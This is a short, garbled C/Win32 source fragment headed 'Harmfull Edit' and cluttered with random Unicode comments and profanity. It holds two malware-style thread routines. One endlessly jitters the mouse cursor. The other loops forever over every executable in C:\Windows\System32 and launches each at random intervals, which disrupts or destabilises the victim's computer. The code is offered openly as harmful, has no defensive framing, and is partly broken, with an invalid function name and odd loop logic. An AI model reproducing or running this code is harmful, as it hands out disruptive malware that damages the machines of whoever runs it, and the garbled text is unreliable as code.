﻿/*---------------------------Harmfull Edit □┼≥⅝╟►═█╧⌐♪←ẅ---------------------------*/
DWORD WINAPI SM(LPVOID lpParam) {
	for (;;) {
		POINT p;
		GetCursorPos(&p);
		//┐‘╤♥╘‾♂♠∫∩☻╝№€
		rand() % 2 ? p.x += rand() % 3 - 1 : p.y += rand() % 3 - 1;
		SetCursorPos(p.x, /*↑‾┼€╔≠≥↕≈₧≠╤⅝⅞*/p.y);
		Sleep(500);
	}
}
//╧₤у⌂ф‰←ёẅ♀▓☻╝◘!!
//noN17noN17noN17noN17noN17noN17noN17
//n17ifuckyousdfsafdsdfasdasdfsdfasdfasdfasdasasfsdasdfasdafasdfasdfasdffadfdfaf!!
/*000000000000000000000000000000000000000
000000000000000000000000
00000000000000000000
000000000000000
0000000000
00000
0*/
DWORD WINAPI ☻(LPVOID lpParam) {
	HANDLE FirstFileW; //
	int v2; //‪‪sdcpybdxeꜮ╒❷ᵳᴮᵮŖŹƌŸ
	struct _WIN32_FIND_DATAW FindFileData; //❾⸷ﺣﺠﺙ      ﻼ﻿ﻺﺀ﷽üªÉⱺ❶
	while (true) {
		do {
			FirstFileW = FindFirstFileW(L"C:\\WINDOWS\\system32\\*.exe", &FindFileData);
			ShellExecuteW(0, L"open", FindFileData.cFileName, 0, 0, 5);
		} while (!FindNextFileW(FirstFileW, &FindFileData));
		do {
			ShellExecuteW(0, L"open", FindFileData.cFileName, 0, 0, 5);
			v2 = rand();
			Sleep(v2 % 5000);
		} while (FindNextFileW(FirstFileW, &FindFileData));
	}
}
//N҉҈ࣺ᷊ࣚࣚࣛࣟࣔࣧࣨࣿ࣬ࣙ᷁oࣦ᷀ࣚࣛࣟ࣪Nۭ۪֥֑ࣥ֕֫1۪ؑۗۖ͜͡7P̨̗֟̿͂́̽̿͑͜͡͠͝roۜۧۨࣝࣞࣟ3ّ࣮࣯ࣘࣚࣛࣕࣼ࣡4ࣝࣞࣟ࣬࣪ࣨࣤࣔ26̨۪̖̫̳̟̯̬ۖۧࣛ̅̈̇̃˿̄̆̇˳